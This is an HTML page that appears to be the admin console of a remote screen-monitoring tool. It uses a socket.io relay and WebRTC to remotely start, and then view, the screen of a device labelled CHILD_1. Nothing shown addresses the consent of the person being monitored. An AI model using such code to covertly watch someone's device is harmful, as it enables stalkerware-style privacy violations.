<!DOCTYPE html>
<html>
<head>
    <title>Fresh Start Monitor</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style> video { width: 300px; border: 2px solid red; } </style>
</head>
<body>
    <h2>Screen Monitor (Clean Test)</h2>
    <button onclick="startScreen()">START SCREEN (CHILD_1)</button>
    <br><br>
    <video id="remoteVideo" autoplay playsinline></video>

    <script>
        const socket = io("https://child-v9no.onrender.com");
        let pc;
        const TARGET_DEVICE = "CHILD_1"; // ðŸ”¥ Must match Android Code

        socket.on("connect", () => {
            console.log("Connected as ADMIN");
            socket.emit("join-room", "ADMIN");
        });

        // 1. Button dabane par command bhejo
        function startScreen() {
            // Hum command bhej rahe hain "CHILD_1_screen" room mein
            const targetRoom = TARGET_DEVICE + "_screen";
            console.log("Sending command to:", targetRoom);
            
            socket.emit("send-command", {
                targetId: targetRoom, 
                command: "start_screen"
            });
        }

        // 2. Offer receive karo
        socket.on("offer", async (data) => {
            console.log("Offer Received!");
            pc = new RTCPeerConnection({
                iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
            });

            pc.ontrack = (event) => {
                document.getElementById("remoteVideo").srcObject = event.streams[0];
            };

            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit("candidate", {
                        target: TARGET_DEVICE + "_screen",
                        candidate: event.candidate.candidate,
                        sdpMid: event.candidate.sdpMid,
                        sdpMLineIndex: event.candidate.sdpMLineIndex
                    });
                }
            };

            await pc.setRemoteDescription({ type: "offer", sdp: data.sdp });
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);

            socket.emit("answer", {
                target: TARGET_DEVICE + "_screen",
                sdp: answer.sdp
            });
        });

        socket.on("candidate", (data) => {
            if (pc) {
                pc.addIceCandidate({
                    candidate: data.candidate,
                    sdpMid: data.sdpMid,
                    sdpMLineIndex: data.sdpMLineIndex
                });
            }
        });
    </script>
</body>
</html>
